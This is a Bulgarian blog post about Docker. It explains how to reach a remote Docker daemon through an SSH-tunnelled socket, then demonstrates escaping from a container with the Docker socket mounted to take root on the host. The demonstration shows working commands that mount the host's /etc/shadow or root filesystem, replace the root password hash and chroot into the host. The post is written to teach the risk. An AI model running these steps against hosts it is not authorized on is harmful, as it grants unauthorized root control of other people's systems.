---
title: "Две заигравки с Docker"
date: 2018-10-25T13:37:42+03:00
draft: false
description: Как можем да се завържем за Docker daemon-а без да го правим публичен и какво става ако контейнер има достъп до него? Една история за призраци, хакерство и корени.
---

<img src="/images/posts/two-docker-tricks/plush-whale.jpg" style="display: block;max-width: 400px;margin: 0 auto;">

# Заигравка 1: Отдалечен достъп до Docker без да отваряме порт

Понякога експериментирам с разни docker контейнери на макбука си. За съжаление, той няма много RAM (само 8GB) и в някои случаи не смогва ако пусна и Docker. Вкъщи съм си пуснал една виртуалка, на която имам Docker. До нея имам SSH достъп отвсякъде през публичен адрес (`ghost.gangelov.net`).

За щастие, китчето може да ползва отдалечен хост. Достатъчно е само (1) да се настрои docker daemon-а да слуша на TCP порт и (2) да се зададе `DOCKER_HOST=tcp://<адрес>:<порт>`.

Това, което не искам да правя, обаче, е да expose-вам docker порт към Целия Интернет™️, [дори защитен](https://docs.docker.com/engine/security/https/). Защо? Първо, много вероятно е в даден момент да се окаже, че има уязвимост. Второ, защитата на сокета включва правилно генериране и разпространение на сертификати, който процес все още не разбирам добре.

![](/images/posts/two-docker-tricks/securing-docker-socket.png)

Друг вариант е да се expose-не само в локалната мрежа и да използвам VPN, когато не съм си вкъщи. Имам настроен VPN, но не искам да трябва целият ми трафик да минава оттам докато използвам docker. Също така, целият сървър става отворен към локалната мрежа, както ще видим след малко.

В даден момент се сетих, че SSH може да отваря тунели към TCP портове. Оказва се, той може да отваря тунели не само между TCP/UDP портове, но и да проксира UNIX socket-и.

Чакай! 🤔 `/var/run/docker.sock` е UNIX socket!

Схемата е следната:

- В един терминал пускаме `ssh -nNT -L ~/.remote-docker.sock:/var/run/docker.sock <хост>`
- В друг терминал задаваме `export DOCKER_HOST=unix:///Users/<потребител>/.remote-docker.sock`

Във втория терминал вече може да се използва `docker`, използвайки отдалечения хост. Всичко това минава през `ssh` и никъде няма отворени docker портове!

_Малко пояснение за опциите на `ssh`:_
- _`-L` мапва локален сокет към отдалечен такъв._
- _`-nNT` кара `ssh` да не отваря интерактивен терминал към сървъра - интересува ни само сокетът._

# Заигравка 2: Да хакнем хоста през закачен Docker сокет

Какво правим обикновено, когато един контейнер има нужда да пуска други контейнери? Закачаме `/var/run/docker.sock` като volume в контейнера:

```sh
$ docker run -it -v /var/run/docker.sock:/var/run/docker.sock <image>
```

Където и да прочетем за този трик - все пише, че не трябвало да се прави. Било риск в сигурността. Щяло да призове Луцифер. [Дори `<center>`-ът не можел да го задържи.](https://stackoverflow.com/a/1732454/557600)

Но понеже ние не вярваме на документацията - ще проверим сами. Можем ли да хакнем сървъра през контейнер, в който е закачен docker сокета? Оказва се - да, при това доста лесно.

За да е честно, въвеждаме едно правило - пускаме един контейнер с `/bin/bash` и имаме право да пишем само в този терминал. Целта ни е да променим root паролата на хоста (извън контейнера).

```sh
 ghost ~ $ docker run -it -v /var/run/docker.sock:/var/run/docker.sock debian:latest bin/bash
Unable to find image 'debian:latest' locally
latest: Pulling from library/debian
bc9ab73e5b14: Pull complete
Digest: sha256:802706fa62e75c96fff96ada0e8ca11f570895ae2e9ba4a9d409981750ca544c
Status: Downloaded newer image for debian:latest
root@8527c0fa48ad:/#
```

_Защо Debian? Защото, както знаем, Ubuntu е южноафрикански за "Не мога да инсталирам Debian". Пък тук няма нужда от инсталиране._

Първо, да си инсталираме docker клиента, за да използваме сокета. _[Следваме инструкциите тук](https://docs.docker.com/install/linux/docker-ce/debian/#install-using-the-repository):_

```sh
root@8527c0fa48ad:/# apt update
[...]
root@8527c0fa48ad:/# apt install -y apt-transport-https ca-certificates curl gnupg2 software-properties-common
[...]
root@8527c0fa48ad:/# curl -fsSL https://download.docker.com/linux/debian/gpg | apt-key add -
OK
root@8527c0fa48ad:/# add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/debian $(lsb_release -cs) stable"
root@8527c0fa48ad:/# apt update && apt install docker-ce -y
[...]
```

Можеше да тръгнем просто от някой image с инсталиран docker, но къде е тръпката в това?

Сега да пробваме:

```sh
root@8527c0fa48ad:/# docker ps
CONTAINER ID        IMAGE                       COMMAND                  CREATED             STATUS                         PORTS                                      NAMES
8527c0fa48ad        debian:latest               "bin/bash"               7 minutes ago       Up 7 minutes                                                              eloquent_curie
[...]
```

Идеално - виждаме собствения си контейнер, значи сме завързани за Docker host-a извън него.

Docker потребителят е `root`. Това значи, че в произволен контейнер можем да закачим всяка директория или файл. Какво бихме искали да mount-нем? Очевиден избор е `/etc/shadow`, където се съхраняват паролите на потребителите. Да видим:

```sh
root@8527c0fa48ad:/# docker run -it -v /etc/shadow:/etc/shadow debian:latest bin/bash
root@10155f95be81:/# cat /etc/shadow
root:$6$Kad231.b$A0EIaZMI.IBoBztK3lMn20A0ELaZMI.IBoBztK3lMn20A0EIaZMI.IBoBztK3lMn20:17110:0:99999:7:::
daemon:*:17001:0:99999:7:::
bin:*:17001:0:99999:7:::
sys:*:17001:0:99999:7:::
sync:*:17001:0:99999:7:::
games:*:17001:0:99999:7:::
man:*:17001:0:99999:7:::
lp:*:17001:0:99999:7:::
mail:*:17001:0:99999:7:::
news:*:17001:0:99999:7:::
uucp:*:17001:0:99999:7:::
[...]
```

На първия ред виждаме хешираната парола на `root`. Всеки ред съдържа стойности, разделени с `:`:

- `root` е, очевидно, името на потребителя.
- `$6$Kad231.b$A0EIaZMI.IBoBztK3lMn20A0ELaZMI.IBoBztK3lMn20A0EIaZMI.IBoBztK3lMn20` е хешът на паролата:
    - `$6$` означава, че хешът е SHA512.
    - `Kad231.b` е солта.
    - `A0EIaZMI.IBoBztK3lMn20A0EIaZMI.IBoBztK3lMn20A0EIaZMI.IBoBztK3lMn20` е самият хеш.
- `17110` е брой дни (от първи януари 1970-та), преди които последно е сменена паролата.
- `0` е минималният брой дни, преди които паролата не може да бъде сменена.
- `99999` е броят дни, след които паролата трябва да бъде сменена.
- `7` е брой дни преди изтичането на паролата, когато потребителят трябва да бъде предупреден, че трябва да я смени.
- Последните две празни стойности са съответно:
    - Колко дни след изтичането на паролата трябва да бъде деактивиран потребителят.
    - Абсолютна дата, на която трябва да бъде деактивиран.

Това, което ни интересува е хешираната парола. Имаме достъп за писане до файла, така че трябва само да генерираме нова:

```sh
root@10155f95be81:/# apt install openssl vim
[...]
root@10155f95be81:/# openssl passwd -1 -salt 123 haxx
$1$123$inYSeyhgm/nz0BAstU9Tc/
```

`-1` казва на `openssl` да генерира `md5` хеш. Това е ужасно счупен хеширащ алгоритъм. Но пък е лесен за генериране, а за целите на демото не ни интересува. `123` е солта към хеша, а `haxx` е самата парола.

Остава само да копираме генерирания низ и да сменим съществуващия в `/etc/shadow`.

```sh
root@10155f95be81:/# vim /etc/shadow
[...]
:wq
```

## Стана ли?

Отваряме нов терминал, закачаме се за сървъра и...

```sh
 ~ $ ssh ghost
Boo!

[...]

 ghost ~ $ su
Password: haxx
                                                    .--`   ``-:.``.-/. ```.
                                                   .-/- ..`-/-.`.::-:...--
                                                  .-.-/:-.`.:.`.-:-.+..../`
                                                  `.:`-:/:``-.`-/+.-/.`.:-.-.
                                                  `.:/../::`.`.-+o-:-.`--..//`
                                                  `.-//.:/-````./o+::.`....-/
                                                  -/.-+:-o-.`.`.-:-+-....::-:
                                                  `+:--+-+-.--.`.``..``.-:.---
                                                   .o-..-....-.-:/oydh+..`:+:`
                                                    -/`..:/+/:::sNNNdhy:``::`
                                                     .-sdmmss+-.:mhdsso/.-+.
                                                      .+smhm/-.``:/+++o-./s/
    ___     _   __  __   ___  ___   ___ _____          `:oddy.--.``.`--:.-/s/
   |_ _|   /_\ |  \/  | | _ \/ _ \ / _ \_   _|          .-/+-.--```.``..-://oo`
    | |   / _ \| |\/| | |   / (_) | (_) || |             -+/.`.``````.:/-..-+do.`
   |___| /_/ \_\_|  |_| |_|_\\___/ \___/ |_|              --.....``.--:o:-.-ss+s:`
                                                         `:s/++++++/:-...:hs/:ys/.
                                                          .s+/+/::-.```-+yy/+/:ysss:`
                                                           .--:/++/-.-oyydh:h/:-o/++:
                                                            ``++//+syhmhshd:hs::+.:o:
                                                              -dmsddyyd+syy:/h::o.:y:
                                                               -mhdysssshso-:+//s.-d+
                                                                sydsoyyhms//osso/--o/
                                                                o/hh+:+sm++NMm+:--.s+
                                                                /:o:-:ody//md:---.:hy
                                                                /oo::o+yy/-:s-----o/-
                                                                /://y/:yh/-.-//-.+/-/
                                                               .---oo/s::ho:..::/y--/
                                                               ..`.--+.-hNNh+:-.-o---
root@ghost:/home/stormbreaker#
```

**Съксес!**

## Втори вариант

Можем да сменим паролата и по друг начин, ако не ни се пипа директно в `/etc/shadow`. Да закачим цялата файлова система на хоста като volume в контейнера:

```sh
root@8527c0fa48ad:/# docker run -it -v /:/host-root debian:latest bin/bash
root@e408da377f10:/# ls /host-root
bin   data  etc   initrd.img	  lib	 lib64	     media  opt   root	sbin  srv  tmp	var	 vmlinuz.old
boot  dev   home  initrd.img.old  lib32  lost+found  mnt    proc  run	snap  sys  usr	vmlinuz
```

След това можем да използваме `/host-root` като root директорията за подпроцес...

```sh
root@e408da377f10:/# chroot /host-root

# ls /
bin   data  etc   initrd.img	  lib	 lib64	     media  opt   root	sbin  srv  tmp	var	 vmlinuz.old
boot  dev   home  initrd.img.old  lib32  lost+found  mnt    proc  run	snap  sys  usr	vmlinuz
```

...след което да сменим паролата с `passwd`:

```sh
# passwd
Enter new UNIX password: haxxored
Retype new UNIX password: haxxored
passwd: password updated successfully
```

Негативът на този подход е, че стана прекалено лесно.

# Последствия

Какво ни интересува това? Няколко неща:

- Всеки, който е в Docker групата е, на практика, `root` на сървъра. Ако мога да пускам контейнери, значи имам пълен достъп до хоста.
- Контейнер, който изисква mount на docker сокета може да бъде ефективен вход за атака. Хубаво е такива да са максимално изолирани от външния свят.
- Ако човек получи неправомерен достъп да променя оригиналния image (например `debian:latest`, `node:latest` или подобен) може да получи достъп до всичко, което го използва.

Нито един сървър не беше наранен по време на писането на този пост.
